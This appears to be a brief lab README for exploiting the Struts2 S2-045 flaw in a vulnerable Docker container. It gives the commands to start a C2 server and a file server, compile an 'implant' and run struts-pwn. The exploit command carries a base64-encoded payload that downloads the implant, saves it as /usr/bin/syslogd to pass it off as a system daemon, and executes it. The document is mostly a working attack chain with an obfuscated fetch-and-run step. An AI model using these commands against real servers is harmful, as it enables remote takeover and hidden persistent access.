Create a .env with
```
IP=192.168.65.254 (docker ip)
PORT=4444
```
Run:
```
docker pull medicean/vulapps:s_struts2_s2-045
docker run -d -p 8080:8080 medicean/vulapps:s_struts2_s2-045
```
```
In powershell:
python c2_server.py
```
```
In powershell:
python -m http.server 8000
```
```
In WSL!!
gcc -static -o implant implant_client.c
cd struts-pwn
python3 struts-pwn.py --url http://localhost:8080/memocreate.action   --cmd "echo d2dldCBodHRwOi8vaG9zdC5kb2NrZXIuaW50ZXJuYWw6ODAwMC9pbXBsYW50IC1PIC91c3IvYmluL3N5c2xvZ2QgJiYgY2htb2QgK3ggL3Vzci9iaW4vc3lzbG9nZCAmJiAvdXNyL2Jpbi9zeXNsb2dk | base64 -d | bash"
```
